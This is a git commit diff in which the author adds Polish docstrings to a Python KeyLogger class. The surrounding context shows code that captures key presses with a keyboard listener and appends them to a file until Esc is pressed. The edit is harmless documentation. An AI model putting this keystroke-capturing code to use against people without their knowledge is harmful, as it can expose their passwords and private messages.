814e147dc14824a02b6fa66c29ebf75d1fbe9521
Mikołaj Kozieł <mkoziel045@gmail.com>
2021-05-30 19:25:27 +0200

    Added docstrings to KeyLogger

--- KeyLogger.py
+++ KeyLogger.py
@@ -7,6 +7,9 @@ from settings import time_iteration, filenames
 class KeyLogger:
 
     def __init__(self, file_path):
+        """
+            Metoda inicjalizująca klasę KeyLogger
+        """
         self.filename = filenames["keys"]
         self.file_path = "\\".join([file_path, self.filename])
 
@@ -17,10 +20,16 @@ class KeyLogger:
         self.stoppingTime = time.time() + time_iteration
 
     def run(self):
+        """
+            Metoda uruchamiająca Listener dla KeyLoggera
+        """
         with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
 
     def on_press(self, key):
+        """
+            Metoda wyzwalana przez wciśnięcie klawisza
+        """
         print(key)
         self.keys.append(key)
         self.currentTime = time.time()
@@ -30,6 +39,9 @@ class KeyLogger:
             self.keys = []
 
     def write_file(self):
+        """
+            Metoda zapisująca do pliku wciśniete klawisze
+        """
         with open(self.file_path, "a") as f:
             for key in self.keys:
                 k = str(key).replace("'", "")
@@ -39,6 +51,10 @@ class KeyLogger:
                     f.write(k)
 
     def on_release(self, key):
+        """
+            Metoda sprawdzająca zdarzenia po puszczeniu dowolnego klawisza
+            :return:
+        """
         if key == Key.esc:
             self.after_stop()
             return False
@@ -48,6 +64,9 @@ class KeyLogger:
         return True
 
     def after_stop(self):
+        """
+            Metoda wyzwalana po zakończeniu działania Listenera
+        """
         self.number_of_iterations += 1
 
         self.currentTime = time.time()
